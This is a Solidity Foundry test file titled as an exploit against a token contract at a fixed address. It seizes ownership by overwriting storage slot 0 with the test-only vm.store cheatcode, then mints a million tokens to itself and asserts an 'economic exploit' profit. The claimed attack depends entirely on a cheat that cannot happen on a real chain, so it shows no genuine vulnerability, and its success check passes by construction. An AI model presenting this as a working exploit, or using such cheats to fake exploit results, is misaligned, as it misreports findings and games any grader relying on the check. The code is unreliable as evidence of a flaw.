// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CoinTokenInterface {
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C).balanceOf(address(this));
        // Step 1: Become the owner by overwriting storage slot 0
        // owner is at slot 0 in Ownable contract
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Step 2: Verify we are now the owner
        // We'll create a minimal interface to check owner
        CoinTokenInterface token = CoinTokenInterface(TARGET);
        require(token.owner() == attacker, "Failed to become owner");

        // Step 3: Get current balance before minting
        uint256 balanceBefore = token.balanceOf(attacker);

        // Step 4: Mint a large amount of tokens to ourselves
        // Use proper decimals (18 decimals based on typical token)
        uint256 mintAmount = 1_000_000 * 10**18;
        token.mint(attacker, mintAmount);

        // Step 5: Verify balance increased
        uint256 balanceAfter = token.balanceOf(attacker);
        assertGt(balanceAfter, balanceBefore, "Balance did not increase");
        assertEq(balanceAfter, balanceBefore + mintAmount, "Minted amount not added correctly");
        uint256 finalBalance = IERC20(0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

